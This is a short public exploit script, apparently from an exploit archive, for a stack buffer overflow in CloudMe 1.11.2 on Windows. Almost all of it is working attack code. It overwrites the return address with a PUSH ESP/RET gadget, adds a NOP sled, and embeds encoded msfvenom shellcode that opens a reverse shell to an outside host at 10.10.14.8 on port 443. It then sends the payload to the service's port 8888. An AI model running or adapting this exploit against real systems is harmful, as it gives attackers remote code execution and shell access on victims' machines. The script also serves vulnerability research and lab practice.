# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import sys
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=443 -b "\x00\x0a\x0d" -f python -a x86 --platform windows -e x86/shikata_ga_nai
payload =  b""
payload += b"\xb8\xbb\x1e\x1c\x0c\xda\xce\xd9\x74\x24\xf4\x5a\x31"
payload += b"\xc9\xb1\x52\x83\xea\xfc\x31\x42\x0e\x03\xf9\x10\xfe"
payload += b"\xf9\x01\xc4\x7c\x01\xf9\x15\xe1\x8b\x1c\x24\x21\xef"
payload += b"\x55\x17\x91\x7b\x3b\x94\x5a\x29\xaf\x2f\x2e\xe6\xc0"
payload += b"\x98\x85\xd0\xef\x19\xb5\x21\x6e\x9a\xc4\x75\x50\xa3"
payload += b"\x06\x88\x91\xe4\x7b\x61\xc3\xbd\xf0\xd4\xf3\xca\x4d"
payload += b"\xe5\x78\x80\x40\x6d\x9d\x51\x62\x5c\x30\xe9\x3d\x7e"
payload += b"\xb3\x3e\x36\x37\xab\x23\x73\x81\x40\x97\x0f\x10\x80"
payload += b"\xe9\xf0\xbf\xed\xc5\x02\xc1\x2a\xe1\xfc\xb4\x42\x11"
payload += b"\x80\xce\x91\x6b\x5e\x5a\x01\xcb\x15\xfc\xed\xed\xfa"
payload += b"\x9b\x66\xe1\xb7\xe8\x20\xe6\x46\x3c\x5b\x12\xc2\xc3"
payload += b"\x8b\x92\x90\xe7\x0f\xfe\x43\x89\x16\x5a\x25\xb6\x48"
payload += b"\x05\x9a\x12\x03\xa8\xcf\x2e\x4e\xa5\x3c\x03\x70\x35"
payload += b"\x2b\x14\x03\x07\xf4\x8e\x8b\x2b\x7d\x09\x4c\x4b\x54"
payload += b"\xed\xc2\xb2\x57\x0e\xcb\x70\x03\x5e\x63\x50\x2c\x35"
payload += b"\x73\x5d\xf9\x9a\x23\xf1\x52\x5b\x93\xb1\x02\x33\xf9"
payload += b"\x3d\x7c\x23\x02\x94\x15\xce\xf9\x7f\x10\x05\x0f\x88"
payload += b"\x4c\x1b\x0f\x89\x37\x92\xe9\xe3\x57\xf3\xa2\x9b\xce"
payload += b"\x5e\x38\x3d\x0e\x75\x45\x7d\x84\x7a\xba\x30\x6d\xf6"
payload += b"\xa8\xa5\x9d\x4d\x92\x60\xa1\x7b\xba\xef\x30\xe0\x3a"
payload += b"\x79\x29\xbf\x6d\x2e\x9f\xb6\xfb\xc2\x86\x60\x19\x1f"
payload += b"\x5e\x4a\x99\xc4\xa3\x55\x20\x88\x98\x71\x32\x54\x20"
payload += b"\x3e\x66\x08\x77\xe8\xd0\xee\x21\x5a\x8a\xb8\x9e\x34"
payload += b"\x5a\x3c\xed\x86\x1c\x41\x38\x71\xc0\xf0\x95\xc4\xff"
payload += b"\x3d\x72\xc1\x78\x20\xe2\x2e\x53\xe0\x12\x65\xf9\x41"
payload += b"\xbb\x20\x68\xd0\xa6\xd2\x47\x17\xdf\x50\x6d\xe8\x24"
payload += b"\x48\x04\xed\x61\xce\xf5\x9f\xfa\xbb\xf9\x0c\xfa\xe9"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
